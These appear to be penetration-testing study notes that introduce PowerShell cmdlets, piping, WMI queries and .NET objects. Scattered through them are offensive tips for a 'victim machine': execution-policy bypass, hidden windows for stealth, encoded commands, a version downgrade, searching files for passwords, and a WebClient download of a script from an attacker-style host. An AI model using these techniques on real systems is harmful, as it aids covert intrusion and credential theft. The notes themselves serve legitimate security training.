# Powershell for Penetration Testing

## Powershell Fundamentals

### The Powershell Command Line Interface

We can launch the powershell CLI from a cmd prompt by using `powershell.exe`

Once we are in a powershell session, we can find help for commands using `powershell /?` or `powershell -?` or `powershell -Help`

Another way to get help with powershell is by using the `Get-Help` cmdlet. We just need to specify what it is that we want to get help with: `Get-Help Get-Process`

We can get more help on cmdlets by using the `-Full` parameter: `Get-Help Get-Process -Full`

Another useful feature is `-Examples` which provides us with useful examples of how to use cmdlets: `Get-Help Get-Process -Examples`

>[!TIP]
>We can update our local help files using `Update-Help`

#### Get-Command

This is a very useful cmdlet which lets us list what is available to us in powershell. If we run it without specifying any arguments it will return a list of *all* available commands.

We can filter the results by using the `-Name` parameter which functions in a similar way to `grep` on unix systems. An example is: `Get-Command -Name *Firewall*`

#### Common Powershell Command Line Parameters

Here are some common and useful command line parameters. We can use abbreviations for powershell parameters and their arguments. Furthermore, we can use different casing to that which is shown here since they are not case-sensitive.

##### -ExecutionPolicy

We can specify that the *ExecutionPolicy* be *bypassed* or *unrestricted* when running powershell scripts. The execution policy on powershell is intended to prevent regular users from executing scripts which might cause problems on their system by preventing some scripts from running.

We will want to bypass any execution policies on the system - we can do this using: `powershell.exe -ExecutionPolicy Bypass .\script.ps1` or `powershell.exe -ExecutionPolicy Unrestricted .\script.ps1`

>[!TIP]
>We can abbreviate this parameter to `-ep` or `-ex` and the `Bypass` argument as `by`

##### -WindowStyle

We can hide the powershell window using: `powershell.exe -WindowStyle Hidden .\script.ps1`

This will hide the powershell CLI on the victim machine which will make our work more stealthy.

>[!TIP]
>We can abbreviate this parameter to `-W` or `-Wi` and the `Hidden` argument as `h` or `hi`

##### -Command

This parameter is used to run a command or script block. An example of this is: `powershell.exe -Command Get-Process`

##### -EncodedCommand

This parameter lets us execute commands which have been base64 encoded: `powershell.exe -EncodedCommand $encodedCommand`

>[!TIP]
>We can abbreviate this parameter to `enco` or `ec`

##### -NoProfile

Profiles are scripts which run when the powershell executable is launched. These scripts (profiles) can cause problems when we are trying to execute commands using powershell so it is a good idea to disable them using: `powershell.exe -NoProfile .\script.ps1`

##### -Version

This parameter lets us downgrade to an older version of powershell. This is useful for if we need to use an older version of powershell in order to accomplish what we want: `powershell.exe -Version 2`

>[!NOTE]
>In order for `-Version` to work the specified older version must be installed on the system

### Cmdlets

Cmdlets are powershell scripts which perform single functions - they are similar to functions in other programming languages.

They are *instances* of *.NET framework classes* derived from the *Cmdlet Base Class*.

There are lots of cmdlets we can use but we can also write our own just as we can define our own functions and methods.

#### Syntax

Most cmdlets follow the same naming convention - they use *Verb-Noun* which helps users determine their functionality.

Lots of cmdlets return output to other cmdlets which is processed via a pipe.

Each cmdlet has its own parameters which we can find by using `Get-Help` with the cmdlet name specified.

If we do not use parameters, the cmdlet will return a limited amount of data in columns.

The returned data is important because we can use it to filter the results.

>[!NOTE]
>The output from cmdlets is known as objects

We can pipe the returned objects to other cmdlets.

```powershell
Get-Process | Sort-Object -Unique | Select-Object ProcessName
```

The above command gets processes and then pipes the returned objects to the `Sort-Object` cmdlet which sorts the objects to make sure only unique ones are returned so there are no duplicates - this is achieved using `-Unique` - the returned objects are then piped to the `Select-Object` cmdlet which selects data based on the parameter `ProcessName` so only the names of the processes is ultimately returned and shown to the user.

We can combine parameters - for example if we want to see the process ids as well as names, we can use:

```powershell
Get-Process | Sort-Object -Unique | Select-Object ProcessName, Id
```

>[!NOTE]
>We can redirect output using the `>` Redirect Operator

#### Useful Cmdlet Examples

##### Get-Process

This returns a list of all processes.

To get *all* the properties related to the processes we can use:

```powershell
Get-Process | Format-List *
```

We can then have a better idea of how to filter the output and select more data about processes and their parameters which are of interest to us:

```powershell
Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path
```

The above command will show us the path property for the chrome and firefox processes.

>[!TIP]
>We can use `fl` as an alias for `Format-List`

##### Get-Alias

If we want to know the aliases for a cmdlet, we can use the `Get-Alias` cmdlet.

```powershell
Get-Alias -Definition Get-ChildItem
```

##### Get-WmiObject

>[!NOTE]
>An alias which is used lots for the `Select-Object` cmdlet is `select`

The example below uses the `Get-WmiObject` cmdlet - this returns data regarding WMI objects - to return data about the OS - this is then piped to `Select-Object` using the `select` alias - the `-Property` parameter is used with the `*` wildcard to return all data relating to the OS.

```powershell
Get-WmiObject -class win32_operatingsystem | select -Property *
```

We can use the `Get-WmiObject` cmdlet to get data about any WMI Class. An example of this is getting data relating to all services with the `win32_service` class.

```powershell
Get-WmiObject -class win32_service | fl *
```

##### Export-Csv

This cmdlet simply exports returned objects to a .csv format.

```powershell
Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\host_info.csv
```

>[!NOTE]
>We can access the Windows Registry hives using `cd HKLM:\`

##### Select-String

This is useful for enumerating systems for specific strings. The example below searches a `Documents` directory for any .txt files which contain the string `pass` in them.

```powershell
Select-String -Path C:\Users\Dduck\Documents\*.txt -Pattern pass*
```

##### Get-Service

This cmdlet returns services - we can filter the returned objects in different ways. The example below searches for services which begin with *S* and then sorts them based on their status in descending order.

```powershell
Get-Service "s" | Sort-Object Status -Descending
```

### Powershell Objects

Powershell is an *Object Oriented* based scripting language and as such utilises *classes* and *objects* which are instantiated from them.

#### Finding Methods for Objects

As mentioned earler, powershell returns *objects* as the data returned from the execution of cmdlets. This means that the data returned posesses *methods* as well as *properties*

We have seen how we can list all the properties of objects using: `Get-Process firefox | Sort-Object -Unique | Format-List *` This command will show us all the properties of the object which has been returned by the `Get-Process` cmdlet along with their corresponding values.

In order to find the *methods* which are associated with objects returned from specified cmdlets we can use:

```powershell
Get-Process | Get-Member -MemberType Method
```

Once we know the methods which are attached to the objects we can call them if we want to. An example would be first of all checking which methods can be called on objects which are returned from the `Get-Process` cmdlet: `Get-Process | Get-Member -MemberType Method` and then deciding to use the `Kill` method on one of the returned objects - in this case `firefox`. We can call the method as follows:

```powershell
Get-Process -Name firefox | Kill
```

#### Creating .NET Objects

We can instantiate our own objects from .NET classes and then use their associated methods to achieve our goals.

An example of this is using the `WebClient` class from the `System.Net` namespace to instantiate an object which can then be used to perform common tasks relating to the transfer of data to and from resources using a URI such as downloading data to a local file.

In order to instnatiate new objects from .NET classes we can use the `New-Object` cmdlet.

```powershell
$webClient = New-Object System.Net.WebClient
$remoteUrl = "http://192.168.56.108/script.ps1"
$file = "C:\Temp\script.ps1"
$webClient.DownloadFile($remoteUrl, $file)
```

This could also be achieved using: `(New-Object Net.WebClient).DownloadFile("http://192.168.56.108/script.ps1", "C:\Temp\script.ps1")`

